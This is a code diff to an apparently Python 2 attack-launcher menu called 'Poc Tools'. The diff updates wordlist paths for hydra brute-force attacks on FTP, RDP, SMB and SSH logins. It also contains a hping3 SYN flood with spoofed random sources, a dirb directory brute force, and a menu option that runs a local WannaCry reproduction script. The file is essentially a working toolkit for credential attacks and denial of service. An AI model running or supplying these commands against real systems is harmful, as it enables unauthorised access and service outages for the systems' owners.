@@ -2,7 +2,7 @@
 import os
 import sys
 import re
-
+import time
 
 
 def Exit():
@@ -17,19 +17,19 @@ def brute_force():
     if(ftpIp == ''):
         print '[-] Skip ftp_Brute Attack.'
     else:
-        os.system('hydra  -L user.list -P ./passwd.list -e ns -V  ftp://%s'%(ftpIp))
+        os.system('hydra  -L user.list -P ./wordlist/passwd.list -e ns -V  ftp://%s'%(ftpIp))
     if(rdpIp == ''):
         print '[-] Skip rdp_Brute Attack.'
     else:
-        os.system('hydra -S %s rdp -l administrator -P ./passwd.list -V'%(rdpIp))
+        os.system('hydra -S %s rdp -l administrator -P ./wordlist/passwd.list -V'%(rdpIp))
     if(smbIp == ''):
 		print '[-] Skip smb_Brute Attack.'
     else:
-		os.system('hydra -l administrator -P ./passwd.list %s smb -V'%(smbIp))
+		os.system('hydra -l administrator -P ./wordlist/passwd.list %s smb -V'%(smbIp))
     if(sshIp == ''):
 		print '[-] Skip ssh_Brute Attack.'
     else:
-		os.system('hydra -L ./user.list -P ./passwd.list -e ns -t 1 -V %s ssh'%(sshIp))
+		os.system('hydra -L ./wordlist/user.list -P ./wordlist/passwd.list -e ns -t 1 -V %s ssh'%(sshIp))
 
 
 def web_dir_brute():
@@ -37,7 +37,7 @@ def web_dir_brute():
     if(url == ''):
         print '[-] Input is null'
     else:
-        os.system('dirb %s ./common.txt'%(url))
+        os.system('dirb %s ./wordlist/common.txt'%(url))
 
 def port_scan():
     hosts = raw_input("Enter scan target hosts ip: ");
@@ -71,8 +71,12 @@ def Dos_attack():
 	else:
 		os.system('hping3 -c 1000  -S -w 64 -p 80 --flood --rand-source %s'%(host))
 
-def Wanacry_worm():
-	os.system('./scene/wanacry.py')
+def Hot_case():
+        print "[*] 1.Wanacry reprodution"
+        case = raw_input("Enter reprodution case: ");
+        if (case == '1'):
+	    os.system('./hotcase/wanacry.py')
+
 
 def main():
   os.system('figlet Poc Tools -f /usr/share/figlet/big.flf')
@@ -84,10 +88,10 @@ def main():
     print "[*] 3. SqlInject attack.\r"
     print "[*] 4. Web dir brute attack.\r"
     print "[*] 5. DOS attack.\r"
-    print "[*] 6. Wanacry worm attack.\r"
+    print "[*] 99. Hot case reprodution.\r"
     print "[*] 0. Exit script.\r\n"
-    attack_type = raw_input("Confirm the type of attack you chose first: ")
-    attacks = {'1': port_scan,'2': brute_force,'3': sqlInject,'4': web_dir_brute,'5': Dos_attack,'6': Wanacry_worm,'0': Exit}
+    attack_type = raw_input("Confirm the type of attack you chose first: ");
+    attacks = {'1': port_scan,'2': brute_force,'3': sqlInject,'4': web_dir_brute,'5': Dos_attack,'99': Hot_case,'0': Exit}
     start_attack = attacks[attack_type]
     start_attack()
     
